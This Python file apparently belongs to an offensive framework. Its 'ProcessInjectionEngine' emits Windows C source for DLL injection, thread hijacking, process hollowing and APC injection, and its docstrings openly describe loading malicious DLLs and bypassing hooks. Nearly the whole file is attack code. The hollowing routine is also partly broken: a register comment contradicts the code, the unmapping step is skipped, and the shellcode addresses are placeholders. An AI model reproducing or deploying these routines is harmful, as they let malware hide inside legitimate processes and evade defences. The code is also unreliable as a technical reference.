"""
Process Injection Techniques
DLL Injection, Thread Hijacking, Process Hollowing
"""

import subprocess
import struct
import ctypes
from pathlib import Path
import tempfile


class ProcessInjectionEngine:
    """Multi-technique process injection framework"""
    
    def __init__(self):
        self.techniques = {
            'dll': self.dll_injection,
            'thread': self.thread_hijacking,
            'hollow': self.process_hollowing,
            'apc': self.apc_injection,
        }
    
    def dll_injection(self, target_process, dll_path, technique='createremotethread'):
        """
        DLL Injection - Load malicious DLL into target process
        Techniques:
        - CreateRemoteThread (basic)
        - NtCreateThreadEx (bypass hooks)
        - QueueUserAPC (async injection)
        """
        
        c_code = f"""
#include <windows.h>
#include <stdio.h>

typedef HANDLE (WINAPI *pNtCreateThreadEx)(
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN LPVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN LPVOID lpStartAddress,
    IN LPVOID lpParameter,
    IN ULONG CreateThreadFlags,
    IN SIZE_T ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN LPVOID lpAttributeList
);

HANDLE InjectDLL(DWORD dwProcessId, const char* dllPath) {{
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (!hProcess) return NULL;
    
    // Allocate memory for DLL path
    LPVOID lpPathBuffer = VirtualAllocEx(
        hProcess, 
        NULL, 
        strlen(dllPath) + 1, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_READWRITE
    );
    
    if (!lpPathBuffer) {{
        CloseHandle(hProcess);
        return NULL;
    }}
    
    // Write DLL path to target process
    if (!WriteProcessMemory(hProcess, lpPathBuffer, (LPVOID)dllPath, strlen(dllPath) + 1, NULL)) {{
        VirtualFreeEx(hProcess, lpPathBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return NULL;
    }}
    
    // Get LoadLibraryA address
    LPVOID lpLoadLibraryA = GetProcAddress(
        GetModuleHandleA("kernel32.dll"), 
        "LoadLibraryA"
    );
    
    if (!lpLoadLibraryA) {{
        VirtualFreeEx(hProcess, lpPathBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return NULL;
    }}
    
    // Create remote thread
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)lpLoadLibraryA,
        lpPathBuffer,
        0,
        NULL
    );
    
    if (hThread) {{
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }}
    
    VirtualFreeEx(hProcess, lpPathBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    
    return hThread;
}}

int main(int argc, char* argv[]) {{
    if (argc < 3) {{
        printf("Usage: %s <process_id> <dll_path>\\n", argv[0]);
        return 1;
    }}
    
    DWORD dwProcessId = atoi(argv[1]);
    InjectDLL(dwProcessId, argv[2]);
    
    return 0;
}}
"""
        return c_code
    
    def thread_hijacking(self, target_process, shellcode_bytes):
        """
        Thread Hijacking - Hijack existing thread and redirect execution
        Techniques:
        - RIP hijacking (x64)
        - EIP hijacking (x86)
        - Context manipulation
        """
        
        c_code = f"""
#include <windows.h>
#include <stdio.h>

DWORD FindThreadInProcess(DWORD dwProcessId) {{
    DWORD dwThreadId = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    
    THREADENTRY32 te32 = {{0}};
    te32.dwSize = sizeof(THREADENTRY32);
    
    if (Thread32First(hSnapshot, &te32)) {{
        do {{
            if (te32.th32OwnerProcessID == dwProcessId) {{
                dwThreadId = te32.th32ThreadID;
                break;
            }}
        }} while (Thread32Next(hSnapshot, &te32));
    }}
    
    CloseHandle(hSnapshot);
    return dwThreadId;
}}

BOOL HijackThread(DWORD dwProcessId, LPVOID lpShellcode) {{
    DWORD dwThreadId = FindThreadInProcess(dwProcessId);
    if (!dwThreadId) return FALSE;
    
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, dwThreadId);
    if (!hThread) return FALSE;
    
    // Suspend thread
    SuspendThread(hThread);
    
    // Get thread context
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_ALL;
    GetThreadContext(hThread, &ctx);
    
    // Redirect instruction pointer
    #ifdef _WIN64
        ctx.Rip = (DWORD64)lpShellcode;
    #else
        ctx.Eip = (DWORD)lpShellcode;
    #endif
    
    // Set new context
    SetThreadContext(hThread, &ctx);
    
    // Resume thread
    ResumeThread(hThread);
    
    CloseHandle(hThread);
    return TRUE;
}}

int main(int argc, char* argv[]) {{
    if (argc < 2) {{
        printf("Usage: %s <process_id>\\n", argv[0]);
        return 1;
    }}
    
    DWORD dwProcessId = atoi(argv[1]);
    HijackThread(dwProcessId, (LPVOID)0x140000000);  // Placeholder
    
    return 0;
}}
"""
        return c_code
    
    def process_hollowing(self, target_executable, replacement_shellcode):
        """
        Process Hollowing - Replace legitimate process memory with malicious code
        Also known as: Process Replacement, RunPE
        
        Steps:
        1. Create target process in suspended state
        2. Unmaps legitimate code
        3. Allocate memory and write shellcode
        4. Resume process
        """
        
        c_code = f"""
#include <windows.h>
#include <stdio.h>

typedef struct {{
    DWORD dwBase;
    DWORD dwSize;
}} MEMORY_SECTION;

BOOL CreateHollowProcess(
    const char* lpTargetPath,
    const char* lpCommandLine,
    LPVOID lpShellcode,
    SIZE_T szShellcodeSize
) {{
    // Create process in suspended state
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    
    if (!CreateProcessA(
        lpTargetPath,
        (LPSTR)lpCommandLine,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi
    )) {{
        return FALSE;
    }}
    
    // Get base address of legitimate process
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_INTEGER;
    GetThreadContext(pi.hThread, &ctx);
    
    #ifdef _WIN64
        DWORD64 dwBase = (DWORD64)ctx.Rcx;  // RDX contains PEB
    #else
        DWORD dwBase = (DWORD)ctx.Ebx;
    #endif
    
    // Read PE header to find entrypoint
    BYTE header[1024];
    SIZE_T dwBytesRead;
    if (!ReadProcessMemory(pi.hProcess, (LPVOID)dwBase, header, sizeof(header), &dwBytesRead)) {{
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }}
    
    // Unmap original image (Windows internals)
    // This is complex and varies by OS version
    
    // Allocate memory at preferred base
    LPVOID lpAlloc = VirtualAllocEx(
        pi.hProcess,
        (LPVOID)dwBase,
        szShellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (!lpAlloc) {{
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }}
    
    // Write shellcode
    if (!WriteProcessMemory(pi.hProcess, lpAlloc, lpShellcode, szShellcodeSize, NULL)) {{
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }}
    
    // Update context to point to shellcode
    ctx.ContextFlags = CONTEXT_INTEGER;
    #ifdef _WIN64
        ctx.Rcx = (DWORD64)lpAlloc;
    #else
        ctx.Eax = (DWORD)lpAlloc;
    #endif
    
    SetThreadContext(pi.hThread, &ctx);
    
    // Resume process
    ResumeThread(pi.hThread);
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return TRUE;
}}

int main(int argc, char* argv[]) {{
    if (argc < 2) {{
        printf("Usage: %s <target_executable>\\n", argv[0]);
        return 1;
    }}
    
    // In real scenario, shellcode would be passed
    CreateHollowProcess(argv[1], "", NULL, 0);
    
    return 0;
}}
"""
        return c_code
    
    def apc_injection(self, target_process, shellcode_bytes):
        """
        APC (Asynchronous Procedure Call) Injection
        - Queue APC to thread
        - Execute when thread enters alertable state
        - Bypasses some hooks
        """
        
        c_code = f"""
#include <windows.h>

typedef VOID (WINAPI *USER_APC_ROUTINE)(
    IN ULONG_PTR Parameter
);

BOOL InjectViaAPC(DWORD dwProcessId, LPVOID lpShellcode) {{
    // Find thread in target process
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te32 = {{sizeof(THREADENTRY32)}};
    
    DWORD dwThreadId = 0;
    if (Thread32First(hSnapshot, &te32)) {{
        do {{
            if (te32.th32OwnerProcessID == dwProcessId) {{
                dwThreadId = te32.th32ThreadID;
                break;
            }}
        }} while (Thread32Next(hSnapshot, &te32));
    }}
    
    CloseHandle(hSnapshot);
    if (!dwThreadId) return FALSE;
    
    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, dwThreadId);
    if (!hThread) return FALSE;
    
    // Queue APC
    BOOL bSuccess = QueueUserAPC(
        (USER_APC_ROUTINE)lpShellcode,
        hThread,
        0
    );
    
    CloseHandle(hThread);
    return bSuccess;
}}

int main(int argc, char* argv[]) {{
    if (argc < 2) {{
        printf("Usage: %s <process_id>\\n", argv[0]);
        return 1;
    }}
    
    DWORD dwPid = atoi(argv[1]);
    InjectViaAPC(dwPid, (LPVOID)0x400000);
    
    return 0;
}}
"""
        return c_code
    
    def generate_injection_payload(self, technique, target_pid, shellcode_bytes):
        """Generate complete injection payload"""
        if technique not in self.techniques:
            raise ValueError(f"Unknown injection technique: {technique}")
        
        if technique == 'dll':
            return self.techniques[technique](target_pid, shellcode_bytes)
        else:
            return self.techniques[technique](target_pid, shellcode_bytes)
    
    def get_supported_techniques(self):
        """List all supported injection techniques"""
        return {
            'dll': 'LoadLibrary DLL injection - standard, often detected',
            'thread': 'Thread hijacking - requires target process suspend',
            'hollow': 'Process hollowing - replaces legitimate process',
            'apc': 'APC injection - queue async procedure call',
        }
